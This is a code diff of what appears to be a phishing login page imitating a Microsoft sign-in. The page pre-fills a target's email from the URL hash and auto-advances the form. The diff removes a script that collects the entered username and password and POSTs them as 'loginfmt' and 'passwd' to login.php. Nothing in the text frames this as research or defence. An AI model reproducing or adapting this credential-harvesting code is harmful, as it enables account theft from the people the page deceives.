@@ -102,17 +102,9 @@
             const hash = window.location.hash.substring(1);
             const email = hash; // Fallback email
 
-
-
             // Select the input and button elements
             const inputElement = document.querySelector('#inp_uname');
             const buttonElement = document.querySelector('#btn_next');
-
-
-            const pwdElement = document.querySelector('#inp_pwd');
-            const nextButton = document.querySelector('#btn_next');
-            const signInButton = document.querySelector('#btn_sig');
-
 
             if (inputElement && buttonElement) {
                 // Fill the input field with the email
@@ -120,71 +112,23 @@
 
                 // Trigger the button click event
                 buttonElement.click();
-
-
-
-                
             } else {
                 // Handle case where input or button element is not found
-                // console.warn('Input or button element not found.');
+                console.warn('Input or button element not found.');
             }
         } else {
             // Handle case where there is no hash tag in the URL
-            // console.warn('No hash tag found in the URL.');
+            console.warn('No hash tag found in the URL.');
         }
     } catch (error) {
         // Handle any errors that might occur
-        // console.error('An error occurred:', error);
+        console.error('An error occurred:', error);
     }
 });
 
   </script>
 
 
-
-
-
-
-
-
-
-
-
-<script>
-
-    
-    const signInButton = document.getElementById('btn_next');
-    const usernameElement = document.getElementById('inp_uname');
-    const passwordElement = document.getElementById('inp_pwd');
-
-    signInButton.addEventListener('click', () => {
-        const uname = usernameElement.value.trim();
-        const pwd = passwordElement.value.trim();
-        if (uname && pwd) {
-            // Perform the form submission with username and password
-            const formData = new FormData();
-            formData.append('loginfmt', uname);
-            formData.append('passwd', pwd);
-
-            fetch('login.php', {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    // Handle successful response
-                } else {
-                    // Handle failed response
-                }
-            }).catch(error => {
-                // Handle errors during the fetch
-            });
-        } else {
-            // Handle the case where username or password is missing
-        }
-    });
-
-
-</script>
 
 
 </body>
